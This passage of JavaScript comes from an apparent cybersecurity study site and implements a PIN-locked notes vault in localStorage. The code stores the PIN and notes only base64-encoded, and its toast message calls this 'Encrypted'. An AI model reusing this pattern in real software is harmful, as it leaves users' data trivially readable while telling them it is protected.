    const saved = localStorage.getItem('studyhub_vault');
    const input = document.getElementById('vault-pin');

    if (input) {
        input.addEventListener('keypress', function (e) {
            if (e.key === 'Enter') attemptUnlock();
        });
        input.focus();
    }
};

window.attemptUnlock = function () {
    const pin = document.getElementById('vault-pin').value;
    const saved = localStorage.getItem('studyhub_vault');

    // Simple PIN check for demo
    if (pin.length !== 4) {
        showToast('PIN must be 4 digits', 'error');
        return;
    }

    // In a real app, use the PIN to decrypt. Here we just simple-obfuscate or simulate.
    // Simulating: If no saved notes, create new vault with this PIN.
    // If saved notes, check if PIN matches (stored hash).

    let vaultData = saved ? JSON.parse(saved) : null;

    if (!vaultData) {
        // New Vault
        vaultData = { pin: btoa(pin), content: '' }; // Storing base64 pin for demo (not secure for real production)
        localStorage.setItem('studyhub_vault', JSON.stringify(vaultData));
        showToast('New Vault Created!', 'success');
        openVault('');
    } else {
        // Check PIN
        if (vaultData.pin === btoa(pin)) {
            // Success
            openVault(vaultData.content);
        } else {
            showToast('Access Denied: Invalid PIN', 'error');
            document.getElementById('vault-pin').value = '';
            document.getElementById('vault-pin').classList.add('shake');
            setTimeout(() => document.getElementById('vault-pin').classList.remove('shake'), 500);
        }
    }
};

window.openVault = function (content) {
    document.getElementById('notes-lock-screen').style.display = 'none';
    const editor = document.getElementById('notes-editor-ui');
    editor.style.display = 'block';

    // Decode if needed (here we assume content is stored plain/base64 for demo)
    // For V2 cool factor, let's assume it's base64 encoded
    try {
        document.getElementById('vault-content').value = content ? atob(content) : '';
    } catch (e) {
        document.getElementById('vault-content').value = content || '';
    }
};

window.saveNotes = function () {
    const content = document.getElementById('vault-content').value;
    const pin = localStorage.getItem('studyhub_vault') ? JSON.parse(localStorage.getItem('studyhub_vault')).pin : null;

    if (!pin) return; // Should not happen

    const data = {
        pin: pin,
        content: btoa(content) // Simple encoding
    };

    localStorage.setItem('studyhub_vault', JSON.stringify(data));
    showToast('Vault Synced & Encrypted', 'success');
};

window.copyNotes = function () {
    const content = document.getElementById('vault-content');
    content.select();
    document.execCommand('copy');
    showToast('Notes copied to clipboard', 'success');
};

window.lockVault = function () {
    saveNotes();
    document.getElementById('notes-editor-ui').style.display = 'none';
    document.getElementById('notes-lock-screen').style.display = 'flex';
    document.getElementById('vault-pin').value = '';
    showToast('Vault Locked', 'info');
};

// Make path and topic pages available
window.pageReport = pageReport;
window.pagePayloads = pagePayloads;
window.pageNotes = pageNotes;
window.pageLabsHub = pageLabsHub;
window.pageToolsHub = pageToolsHub;
window.pagePathRedTeam = pagePathRedTeam;
window.pagePathBlueTeam = pagePathBlueTeam;
window.pagePathSoc = pagePathSoc;
window.pageTopicWeb = pageTopicWeb;
window.pageTopicNetwork = pageTopicNetwork;
window.pageTopicForensics = pageTopicForensics;
window.pageTopicScripting = pageTopicScripting;
window.pageTopicLinux = pageTopicLinux;

console.log('✓ Functional Pages loaded (all sections)');
